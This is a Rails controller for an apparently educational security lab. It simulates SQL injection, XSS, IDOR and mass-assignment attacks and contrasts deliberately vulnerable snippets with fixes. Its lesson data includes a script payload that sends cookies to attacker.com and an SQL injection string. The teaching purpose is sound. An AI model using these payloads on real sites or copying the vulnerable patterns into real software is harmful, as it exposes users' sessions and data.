class SecurityLabController < ApplicationController
  before_action :require_authentication

  LABS = {
    "sql_injection" => {
      name: "SQL Injection Lab",
      icon: "💉",
      category: "OWASP Top 10 · Injection",
      vulnerable_code: "User.where(\"email = '\#{params[:email]}' AND active = true\")",
      secure_code: "User.where(email: params[:email], active: true)",
      sample_payload: "' OR '1'='1' --",
      explanation: "Direct string interpolation lets user input break out of SQL string literals and execute arbitrary clauses. Using parameterization binds variables separately from query structure."
    },
    "xss" => {
      name: "Cross-Site Scripting (XSS) Lab",
      icon: "⚡",
      category: "OWASP Top 10 · Client-Side Security",
      vulnerable_code: "<%= @comment.body.html_safe %>",
      secure_code: "<%= sanitize @comment.body %> (or standard <%= @comment.body %> without html_safe)",
      sample_payload: "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
      explanation: "Calling .html_safe on untrusted user input disables Rails' automatic HTML escaping. An attacker can execute arbitrary JavaScript in the victim's session."
    },
    "idor" => {
      name: "Insecure Direct Object Reference (IDOR)",
      icon: "🚪",
      category: "OWASP Top 10 · Broken Access Control",
      vulnerable_code: "@invoice = Invoice.find(params[:id])",
      secure_code: "@invoice = current_user.invoices.find(params[:id]) # or authorize @invoice",
      sample_payload: "GET /invoices/9924 (Victim's private invoice ID)",
      explanation: "Relying solely on database record IDs without verifying ownership or tenant scoping allows any authenticated user to view or modify any other user's sensitive data."
    },
    "mass_assignment" => {
      name: "Mass Assignment Lab",
      icon: "🛡️",
      category: "OWASP Top 10 · Privilege Escalation",
      vulnerable_code: "@user.update(params[:user])",
      secure_code: "@user.update(params.require(:user).permit(:name, :email))",
      sample_payload: "{\"user\": {\"name\": \"Alice\", \"role\": \"admin\"}}",
      explanation: "Without Strong Parameters, an attacker can append unexpected fields like 'role', 'admin', or 'account_balance' to their request payload and overwrite database columns."
    }
  }.freeze

  def show
    @active_lab = params[:lab].presence || "sql_injection"
    @lab_data = LABS[@active_lab] || LABS["sql_injection"]
  end

  def test_exploit
    lab = params[:lab].presence || "sql_injection"
    payload = params[:payload].to_s
    mode = params[:mode].presence || "vulnerable" # "vulnerable" or "secured"

    @result = case lab
    when "sql_injection"
                if mode == "vulnerable" && payload.include?("OR")
                  {
                    "success" => true,
                    "simulated_query" => "SELECT * FROM users WHERE email = '#{payload}' AND active = true;",
                    "output" => "🚨 EXPLOIT SUCCESSFUL: 4,820 user records dumped! Authentication completely bypassed.",
                    "status" => "vulnerable"
                  }
                else
                  {
                    "success" => false,
                    "simulated_query" => "SELECT * FROM users WHERE email = $1 AND active = $2; [\"#{payload}\", true]",
                    "output" => "✔ BLOCKED: Parameterized query treated input as literal string. 0 unauthorized rows returned.",
                    "status" => "secured"
                  }
                end
    when "xss"
                if mode == "vulnerable" && payload.include?("<script")
                  {
                    "success" => true,
                    "simulated_dom" => "<div class=\"comment\">#{payload}</div>",
                    "output" => "🚨 EXPLOIT SUCCESSFUL: Script executed in browser! Cookie session token exfiltrated to attacker.",
                    "status" => "vulnerable"
                  }
                else
                  escaped = ERB::Util.html_escape(payload)
                  {
                    "success" => false,
                    "simulated_dom" => "<div class=\"comment\">#{escaped}</div>",
                    "output" => "✔ BLOCKED: Input automatically escaped as HTML entities (&lt;script&gt;). Script rendered as inert text.",
                    "status" => "secured"
                  }
                end
    when "idor"
                if mode == "vulnerable"
                  {
                    "success" => true,
                    "output" => "🚨 EXPLOIT SUCCESSFUL: Accessed Invoice #9924 belonging to CEO. Confidential billing details exposed!",
                    "status" => "vulnerable"
                  }
                else
                  {
                    "success" => false,
                    "output" => "✔ BLOCKED: ActiveRecord::RecordNotFound (Pundit::NotAuthorizedError). Tenant scope restricted query to current_user.",
                    "status" => "secured"
                  }
                end
    when "mass_assignment"
                if mode == "vulnerable" && payload.include?("admin")
                  {
                    "success" => true,
                    "output" => "🚨 EXPLOIT SUCCESSFUL: User role escalated to 'admin' (role=2). Full system compromise!",
                    "status" => "vulnerable"
                  }
                else
                  {
                    "success" => false,
                    "output" => "✔ BLOCKED: ActionController::UnpermittedParameters: found unpermitted parameter: :role. Privilege escalation prevented.",
                    "status" => "secured"
                  }
                end
    end

    if @result["status"] == "secured"
      Labs::Completion.new(
        user: current_user, lab_key: "security_lab", xp: 150,
        reason: "Secured Vulnerability in Security Fortress: #{LABS[lab][:name]}",
        detail: lab
      ).call
    end

    @active_lab = lab
    @lab_data = LABS[@active_lab]

    respond_to do |format|
      format.turbo_stream
      format.html { redirect_to security_lab_path(lab: lab) }
    end
  end
end
